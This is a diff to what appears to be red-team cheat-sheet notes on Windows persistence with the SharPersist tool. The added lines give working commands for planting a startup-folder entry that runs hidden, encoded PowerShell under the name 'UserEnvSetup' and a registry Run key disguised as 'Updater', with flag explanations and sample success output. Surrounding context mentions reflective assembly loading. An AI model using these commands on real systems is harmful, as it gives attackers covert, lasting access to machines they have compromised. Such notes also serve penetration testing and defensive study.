@@ -20,9 +20,9 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 
 
-##Presistance 
+Presistance 
 
-###Task Scheduler
+-Task Scheduler
 
 Using SharpPresist
 
@@ -36,10 +36,38 @@ The above snippet will produce a Base64 string which will be supplied in the sni
 ```
 
 
-    -t --> the desired persistence technique.
-    -c --> command to execute.
-    -a --> any arguments for that command.
-    -n --> the name of the task.
-    -m --> to add the task (you can also remove, check and list).
-    -o --> the task frequency.
+   -t --> the desired persistence technique.
+   -c --> command to execute.
+   -a --> any arguments for that command.
+   -n --> the name of the task.
+   -m --> to add the task (you can also remove, check and list).
+   -o --> the task frequency.
+   
+ -Startup Folder
+ 
+ ```powershell
+ .\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64_HERE" -f "UserEnvSetup" -m add
+ ```
+ 
+   -f --> the filename to save as.
+
+
+-Registry AutoRun
+
+```powershell
+./SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
+
+Output:
+[*] INFO: Adding registry persistence
+[*] INFO: Command: C:\ProgramData\Updater.exe
+[*] INFO: Command Args: /q /n
+[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+[*] INFO: Registry Value: Updater
+[*] INFO: Option: 
+[+] SUCCESS: Registry persistence added
+```
+
+
+   -k --> the registry key to modify.
+   -v --> the name of the registry key to create.
 
